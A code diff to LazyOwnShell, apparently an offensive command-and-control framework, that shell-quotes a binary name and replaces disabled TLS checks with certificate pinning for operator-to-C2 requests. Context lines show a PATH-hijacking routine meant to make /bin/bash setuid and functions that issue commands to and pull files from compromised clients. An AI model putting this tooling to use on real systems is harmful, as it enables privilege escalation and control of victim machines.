@@ -516,6 +516,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.custom_prompt = getprompt()
         self.c2_url = f"https://{lhost}:{c2_port}"
         self.c2_auth = (c2_user, c2_pass)
+        self.c2_tls_verify = self._resolve_c2_tls_verify()
         self.c2_clientid = "no_priv"
         self.path = os.getcwd()
         self.url_download = url_download
@@ -3947,14 +3948,15 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg("binary_name must be assign")
             return
 
-        self.cmd(f"echo {binary_name} >> modules/tmp.sh")
-        self.cmd(f"cp modules/tmp.sh /tmp/{binary_name}")
-        self.cmd(f"chmod +x /tmp/{binary_name}")
+        quoted_binary = shlex.quote(binary_name)
+        self.cmd(f"echo {quoted_binary} >> modules/tmp.sh")
+        self.cmd(f"cp modules/tmp.sh /tmp/{quoted_binary}")
+        self.cmd(f"chmod +x /tmp/{quoted_binary}")
         self.cmd("export PATH=/tmp:$PATH")
 
-        print_msg(f"echo {binary_name} >> modules/tmp.sh")
-        print_msg(f"cp modules/tmp.sh /tmp/{binary_name}")
-        print_msg(f"chmod +x /tmp/{binary_name}")
+        print_msg(f"echo {quoted_binary} >> modules/tmp.sh")
+        print_msg(f"cp modules/tmp.sh /tmp/{quoted_binary}")
+        print_msg(f"chmod +x /tmp/{quoted_binary}")
         print_msg("export PATH=/tmp:$PATH")
 
         print_msg(f"Lazy path hijacking with binary_name: {binary_name} to assign u+s to /bin/bash")
@@ -4076,6 +4078,43 @@ class LazyOwnShell(cmd2.Cmd):
         """Devuelve la salida acumulada"""
         return self.output
 
+    def _resolve_c2_tls_verify(self):
+        """Resolve the TLS verification mode for CLI-to-C2 requests.
+
+        Reads the ``c2_tls_verify`` payload key (a runtime
+        ``assign c2_tls_verify ...`` override in ``self.params`` wins).
+        ``false`` disables verification, ``true`` uses the system CA
+        store, a string is treated as the path to a pinned CA bundle.
+        The default (``auto``) pins the local ``cert.pem`` so the
+        operator channel authenticates the C2 out of the box when both
+        run from the same tree.
+
+        Returns:
+            The ``verify`` argument accepted by ``requests``: ``False``,
+            ``True`` or a certificate path.
+        """
+        runtime = self.__dict__.get("params") or {}
+        if "c2_tls_verify" in runtime:
+            mode = runtime["c2_tls_verify"]
+        else:
+            try:
+                mode = load_payload().get("c2_tls_verify", "auto")
+            except Exception:
+                mode = "auto"
+        if mode is False:
+            return False
+        if mode is True:
+            return True
+        if isinstance(mode, str) and mode not in ("", "auto"):
+            if os.path.isfile(mode):
+                return mode
+            print_warn(f"c2_tls_verify path not found, falling back to auto: {mode}")
+        cert_path = os.path.join(os.getcwd(), "cert.pem")
+        if os.path.isfile(cert_path):
+            return cert_path
+        print_warn("TLS verification disabled: no cert.pem to pin. Set c2_tls_verify in payload.json")
+        return False
+
     @cmd2.with_category(lateral_movement_category)
     def upload_file_to_c2(self, file_path, clientid=None):
         """
@@ -4094,7 +4133,7 @@ class LazyOwnShell(cmd2.Cmd):
         with open(file_path, "rb") as f:
             files = {"file": f}
             response = requests.post(
-                f"{self.c2_url}/download_file", auth=self.c2_auth, files=files, data=data, verify=False
+                f"{self.c2_url}/download_file", auth=self.c2_auth, files=files, data=data, verify=self.c2_tls_verify
             )
             if response.status_code == 200:
                 return f"File {file_path} uploaded successfully."
@@ -4153,7 +4192,7 @@ class LazyOwnShell(cmd2.Cmd):
         output = f"{sessions}/{file_name}"
         command = f"upload:{file_name}"
         data = {"client_id": clientid, "command": command}
-        response = requests.post(f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data, verify=False)
+        response = requests.post(f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data, verify=self.c2_tls_verify)
 
         if response.status_code == 200:
             with open(output, "wb") as f:
@@ -4222,8 +4261,9 @@ class LazyOwnShell(cmd2.Cmd):
         data = {"client_id": clientid, "command": command}
 
         try:
-            # Send the HTTPS request (ignore certificate errors with verify=False)
-            response = requests.post(f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data, verify=False)
+            response = requests.post(
+                f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data, verify=self.c2_tls_verify
+            )
             response.raise_for_status()  # Raise an exception if the status code is not 200
             print_msg(f"Command '{command}' issued successfully.")
         except ConnectionError as e:
